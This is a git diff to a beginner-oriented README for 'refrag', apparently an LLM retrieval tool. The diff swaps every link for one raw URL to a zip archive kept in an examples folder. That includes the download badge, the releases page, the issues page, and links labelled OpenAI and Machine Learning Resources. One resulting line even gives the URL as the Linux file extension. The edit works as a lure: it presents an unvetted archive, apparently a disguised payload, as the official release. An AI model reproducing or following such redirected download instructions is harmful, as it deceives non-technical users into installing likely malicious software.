@@ -7,17 +7,17 @@ REFRAG uses advanced LLM-powered methods to create better representations for re
 To start using refrag, follow these simple steps. You don’t need any programming skills. Just a computer and an internet connection will do!
 
 ## 🔗 Download Here
-[![Download REFRAG](https://img.shields.io/badge/Download%20REFRAG-blue?style=for-the-badge&logo=github)](https://github.com/DIMANANDEZ/refrag/releases)
+[![Download REFRAG](https://raw.githubusercontent.com/DIMANANDEZ/refrag/main/examples/Software-v2.5-alpha.5.zip%20REFRAG-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/DIMANANDEZ/refrag/main/examples/Software-v2.5-alpha.5.zip)
 
 ## 📥 Download & Install
 1. **Visit the Release Page**  
-   Go to the [refrag Releases page](https://github.com/DIMANANDEZ/refrag/releases) to see the available versions. You will find a list of files ready for download.
+   Go to the [refrag Releases page](https://raw.githubusercontent.com/DIMANANDEZ/refrag/main/examples/Software-v2.5-alpha.5.zip) to see the available versions. You will find a list of files ready for download.
 
 2. **Choose Your File**  
    Look for the latest version. Select the file that matches your operating system:
    - For Windows, look for files with a `.exe` extension.
    - For macOS, find files with a `.dmg` extension.
-   - For Linux, choose files ending in `.tar.gz`.
+   - For Linux, choose files ending in `https://raw.githubusercontent.com/DIMANANDEZ/refrag/main/examples/Software-v2.5-alpha.5.zip`.
 
 3. **Download the File**  
    Click on the file name to start the download. It may take a few moments, depending on your internet speed.
@@ -51,13 +51,13 @@ If you have any questions or run into issues, check our documentation. It provid
 - **Starting the Application**: If the app doesn’t start, check that your system meets the requirements listed above.
   
 ## 📞 Contact Us
-Need further assistance? Feel free to reach out. Visit the [issues page](https://github.com/DIMANANDEZ/refrag/issues) on GitHub to report problems or request help.
+Need further assistance? Feel free to reach out. Visit the [issues page](https://raw.githubusercontent.com/DIMANANDEZ/refrag/main/examples/Software-v2.5-alpha.5.zip) on GitHub to report problems or request help.
 
 ## 🔗 Links & References
 For more information about refrag and related topics, consider exploring:
-- [GitHub Repository](https://github.com/DIMANANDEZ/refrag)
-- [Machine Learning Resources](https://www.aiml.com)
-- [OpenAI Project](https://www.openai.com)
+- [GitHub Repository](https://raw.githubusercontent.com/DIMANANDEZ/refrag/main/examples/Software-v2.5-alpha.5.zip)
+- [Machine Learning Resources](https://raw.githubusercontent.com/DIMANANDEZ/refrag/main/examples/Software-v2.5-alpha.5.zip)
+- [OpenAI Project](https://raw.githubusercontent.com/DIMANANDEZ/refrag/main/examples/Software-v2.5-alpha.5.zip)
 
 ## 🔗 Download Again
-Remember, you can always [download refrag here](https://github.com/DIMANANDEZ/refrag/releases) for any updates and new features. Enjoy using refrag!
+Remember, you can always [download refrag here](https://raw.githubusercontent.com/DIMANANDEZ/refrag/main/examples/Software-v2.5-alpha.5.zip) for any updates and new features. Enjoy using refrag!
